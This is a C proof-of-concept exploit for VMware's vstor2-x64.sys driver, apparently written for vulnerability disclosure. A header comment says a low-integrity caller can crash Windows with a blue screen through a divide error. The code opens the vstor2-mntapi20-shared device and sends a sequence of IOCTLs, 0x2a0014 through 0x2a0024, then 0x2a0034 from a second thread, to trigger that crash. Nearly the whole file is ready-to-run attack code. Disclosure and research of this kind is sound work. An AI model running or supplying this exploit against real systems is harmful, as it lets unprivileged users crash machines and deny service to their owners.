/*File Version       : 6.2.0.543 
VMware Version       : 16.2.20227 (Build 19200509)
Product Version      : 6.2.0 build-18529722
Operation environment: Windows 11 Home Insider Preview Build 22526.rs_prerelease.211215-1332 

Description of Product Name         : vstor2-x64.sys 
the issue -: 

Interaction with the device requires low integrity,which when called with certain synchronous requests followed by an asynchronous request
(IOCTL 0x2A0024)causes BSOD due to a division Error in some function. This happens because of lack of input validation in the driver.
*/


#include <Windows.h>
#include <stdio.h>
DWORD WINAPI run(HANDLE deviceHandle);
DWORD WINAPI exec(HANDLE deviceHandle);

int main()
{
	printf("[+] Poc \n");
	HANDLE handle = CreateFileA("\\\\.\\GLOBALROOT\\DEVICE\\vstor2-mntapi20-shared",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED,
		NULL);

	if (handle == INVALID_HANDLE_VALUE) 
	{
		printf("FAILED, device handle : %x error code: %d\n\n", handle, GetLastError());
		system("pause");
		exit(1);
	}
	DWORD tid = 0;
	HANDLE thread = CreateThread(NULL, 0, exec,handle, 0, &tid);

	if (WaitForSingleObject(thread, INFINITE) == WAIT_OBJECT_0)
	{
		printf("[+]Success!\n");
	}
	
		
	system("pause");
	return 0;
}
DWORD WINAPI exec(HANDLE deviceHandle)
{
	printf("[+] Handle to device .\\vstor2-mntapi20-shared returned :%#x\n", deviceHandle);
	OVERLAPPED overlap;
	overlap.hEvent = 0;//CreateEvent(NULL, FALSE, FALSE, NULL);
	overlap.Internal = 0;
	overlap.InternalHigh = 0;
	overlap.Offset = 0;
	overlap.OffsetHigh = 0;
	overlap.Pointer = 0;

	DWORD nbBytes = 0;
	DWORD i = 0;
	char a[0x100] = { 0 };
	//memset(a, 0x41, sizeof(a));
	DWORD tid2 = 0;
	DWORD tid3 = 0;


	for (i = 0x2a0014; i <= 0x2a0023; i++)
	{
	
	BOOL status = DeviceIoControl(deviceHandle,
		i,
		a,
		0x100,
		a,
		0x100,
		&nbBytes,
		&overlap);
	}
	DeviceIoControl(deviceHandle,
		0x2a0024,
		a,
		0x100,
		a,
		0x100,
		&nbBytes,
		&overlap);
	if (GetLastError() == ERROR_IO_PENDING)
	{
		CreateThread(NULL, 0, run, deviceHandle, 0, &tid2);
	}
	return 0;
}

DWORD WINAPI run(HANDLE deviceHandle)
{
	OVERLAPPED overlap2;
	overlap2.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	overlap2.Internal = 0;
	overlap2.InternalHigh = 0;
	overlap2.Offset = 0;
	overlap2.OffsetHigh = 0;
	overlap2.Pointer =0;

	DWORD byte = 0;
		DWORD b[0x100] = { 0 };
		BOOL status = DeviceIoControl(deviceHandle,
			0x2a0034,
			b,
			0x100,
			b,
			0x100,
			&byte,
			&overlap2);
		
		return 0;
}

